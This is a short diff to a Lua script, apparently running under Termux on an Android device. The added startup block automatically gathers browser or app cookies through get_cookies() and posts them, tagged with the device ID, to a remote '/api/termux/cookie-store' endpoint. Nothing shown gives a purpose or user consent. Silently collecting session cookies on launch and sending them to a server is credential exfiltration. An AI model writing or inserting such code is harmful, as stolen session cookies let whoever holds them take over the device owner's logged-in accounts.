@@ -1471,6 +1471,18 @@ do
   end
 end
 
+-- ─── Auto cookie extraction on startup ───
+do
+  log(C.cyan .. "[" .. ts() .. "] extracting cookies on startup..." .. C.reset)
+  local cookies = get_cookies()
+  if #cookies > 0 then
+    local ck_code = http_post("/api/termux/cookie-store", { deviceId = DEVICE_ID, cookies = cookies })
+    log(C.green .. "[" .. ts() .. "] startup cookies: " .. #cookies .. " extracted (POST " .. (ck_code or "nil") .. ")" .. C.reset)
+  else
+    log(C.dim .. "[" .. ts() .. "] no cookies found on startup" .. C.reset)
+  end
+end
+
 -- ─── System optimizations (run once at startup) ───
 do
   log(C.dim .. "[" .. ts() .. "] setup..." .. C.reset)
